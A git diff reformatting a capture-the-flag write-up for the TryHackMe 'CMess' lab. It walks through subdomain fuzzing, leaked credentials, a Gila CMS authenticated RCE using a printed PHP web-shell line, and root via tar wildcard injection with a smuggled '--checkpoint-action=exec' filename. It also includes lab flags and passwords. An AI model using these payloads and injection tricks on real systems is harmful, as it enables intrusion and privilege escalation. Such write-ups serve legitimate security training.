@@ -1,24 +1,25 @@
 ---
 sticker: emoji//1f335
 ---
-# ENUMERATION
----
 
+# CMESS
 
+## ENUMERATION
 
-## OPEN PORTS
----
+***
 
+### OPEN PORTS
+
+***
 
 | PORT | SERVICE |
-| :--- | :------ |
+| ---- | ------- |
 | 22   | SSH     |
 | 80   | HTTP    |
 
+## RECONNAISSANCE
 
-
-# RECONNAISSANCE
----
+***
 
 We need to add `cmess.thm` to `/etc/hosts`:
 
@@ -26,11 +27,9 @@ We need to add `cmess.thm` to `/etc/hosts`:
 echo 'IP cmess.thm' | sudo tee -a /etc/hosts
 ```
 
-
 Let's check the web application:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250428141314.png)
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250428141314.png)
 
 Let's fuzz for subdomains and directories:
 
@@ -64,7 +63,7 @@ dev                     [Status: 200, Size: 934, Words: 191, Lines: 31, Duration
 
 We found a `dev.cmess.thm` subdomain, let's add it to `/etc/hosts` and take a look:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250428142150.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250428142150.png)
 
 We got a log, which reveals credentials, at the fuzzing for directories, I found a `/login` page, let's use them here:
 
@@ -72,10 +71,9 @@ We got a log, which reveals credentials, at the fuzzing for directories, I found
 andre@cmess.thm:KPFTN_f2yxe% 
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250428142256.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250428142256.png)
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250428142315.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250428142315.png)
 
 We get redirected back to the home page, we get two cookies assigned:
 
@@ -86,35 +84,31 @@ PHPSESSID
 
 With this, we can search for an exploit regarding `Gila CMS`:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250428142441.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250428142441.png)
 
 We got `Authenticated RCE`, this may be our way, let's proceed with exploitation.
 
+## EXPLOITATION
 
+***
 
-# EXPLOITATION
----
-
-The vulnerability in Gila CMS 1.10.9 allows authenticated attackers to execute arbitrary code on the target server by exploiting insufficient file validation in the file manager. After logging in with valid admin credentials, an attacker can upload a malicious PHP file (e.g., `shell.php7`) to the `tmp/` directory via the `/fm/upload` endpoint. The CMS does not properly restrict file types, enabling the upload of a web shell containing `<?php system($_GET["cmd"]);?>`, which executes OS commands via the `cmd` parameter.
-
+The vulnerability in Gila CMS 1.10.9 allows authenticated attackers to execute arbitrary code on the target server by exploiting insufficient file validation in the file manager. After logging in with valid admin credentials, an attacker can upload a malicious PHP file (e.g., `shell.php7`) to the `tmp/` directory via the `/fm/upload` endpoint. The CMS does not properly restrict file types, enabling the upload of a web shell containing `<?php system($_GET["cmd"]);?>`, which executes OS commands via the `cmd` parameter.
 
 Exploit: https://www.exploit-db.com/exploits/51569
 
-
-
 Let's get the exploit and try to use it with our credentials:
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250428142643.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250428142643.png)
 
 If we check our listener:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250428142656.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250428142656.png)
 
 We got our shell, let's begin privilege escalation:
 
-# PRIVILEGE ESCALATION
----
+## PRIVILEGE ESCALATION
+
+***
 
 First thing to do is to stabilize our shell:
 
@@ -128,7 +122,7 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250428142942.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250428142942.png)
 
 If we check `config.php`:
 
@@ -192,7 +186,7 @@ drwx------  3 root     root     4096 Apr 28 12:04 systemd-private-6033f99b25c244
 
 There is a `andre_backup.tar.gz` file, let's get it in our machine to check if it got some credentials in it:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250428143653.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250428143653.png)
 
 We get a file named `note`:
 
@@ -204,7 +198,7 @@ Anything in here will be backed up!
 
 Seems like there is a directory where things get backed up, let's use linpeas to check if its true:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250428150004.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250428150004.png)
 
 There is a `password.bak` located at `/opt`, let's check it out:
 
@@ -220,17 +214,16 @@ Let's switch to ssh:
 andre:UQfsdCB7aAP6
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250428151659.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250428151659.png)
 
 ```
 andre@cmess:~$ cat user.txt
 thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}
 ```
 
-
 If we use linpeas again, we can notice this:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250428152151.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250428152151.png)
 
 ```
 */2 *   * * *   root    cd /home/mandre/backup && tar -zcf /tmp/andre_backup.tar.gz *
@@ -253,14 +246,14 @@ echo "" > "--checkpoint-action=exec=sh shell.sh"
 chmod +x shell.sh
 ```
 
-- `--checkpoint=1`: Forces `tar` to trigger a checkpoint
-- `--checkpoint-action=exec=...`: Executes `shell.sh` when the checkpoint is reached.
+* `--checkpoint=1`: Forces `tar` to trigger a checkpoint
+* `--checkpoint-action=exec=...`: Executes `shell.sh` when the checkpoint is reached.
 
 3. Start our listener and wait for the shell:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250428152829.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250428152829.png)
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250428152834.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250428152834.png)
 
 There we go, we got root, let's read our final flag and end the CTF:
 
@@ -269,7 +262,4 @@ root@cmess:/home/andre/backup# cat /root/root.txt
 thm{9f85b7fdeb2cf96985bf5761a93546a2}
 ```
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250428152914.png)
-
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250428152914.png)
